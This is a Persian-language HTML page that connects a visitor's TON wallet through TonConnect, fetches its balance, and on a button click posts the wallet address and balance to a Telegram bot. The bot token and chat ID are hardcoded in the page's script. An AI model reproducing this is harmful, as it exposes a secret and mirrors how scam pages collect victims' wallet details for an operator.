<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اتصال به ولت تون کیپر</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        #ton-connect-button {
            background-color: #0066cc;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 18px;
            border-radius: 5px;
        }
        #ton-connect-button:hover {
            background-color: #0055a5;
        }
        #wallet-info {
            margin-top: 20px;
            font-size: 18px;
        }
    </style>
</head>
<body>

    <h1>اتصال به ولت تون کیپر</h1>
    <button id="ton-connect-button">اتصال به تون کیپر</button>
    <button id="send-to-telegram" style="display: none; margin-top: 20px;">ارسال موجودی به تلگرام</button>
    
    <div id="wallet-info"></div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://promahdimosavi.github.io/schams/manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        let walletInfo = null;

        document.getElementById("ton-connect-button").addEventListener("click", () => {
            tonConnectUI.connect().then((wallet) => {
                walletInfo = wallet;
                document.getElementById("wallet-info").innerHTML = `اتصال موفق!<br>آدرس ولت: ${wallet.address}`;
                document.getElementById("send-to-telegram").style.display = "inline-block";
            }).catch((error) => {
                console.error("اتصال با شکست مواجه شد:", error);
                document.getElementById("wallet-info").innerHTML = "خطا در اتصال. لطفا دوباره تلاش کنید.";
            });
        });

        document.getElementById("send-to-telegram").addEventListener("click", async () => {
            if (!walletInfo) {
                alert("ابتدا به ولت متصل شوید.");
                return;
            }

            // دریافت موجودی از سرور API
            const walletAddress = walletInfo.address;
            try {
                const response = await fetch(`https://tonapi.io/v1/account/getBalance?address=${walletAddress}`);
                const data = await response.json();
                const balance = data.balance / Math.pow(10, 9); // تبدیل به TON
                
                // ارسال به ربات تلگرام
                const botToken = "7799310540:AAGBrg_g6F2xrUbxC00qMAo0dc-tK7GFMSs"; // توکن ربات تلگرام
                const chatId = "7613159738";   // آی‌دی چت شما
                const message = `آدرس ولت: ${walletAddress}\nموجودی: ${balance} TON`;

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                alert("موجودی با موفقیت به تلگرام ارسال شد!");
            } catch (error) {
                console.error("خطا در ارسال پیام به تلگرام:", error);
                alert("خطا در ارسال پیام به تلگرام.");
            }
        });
    </script>

</body>
</html>
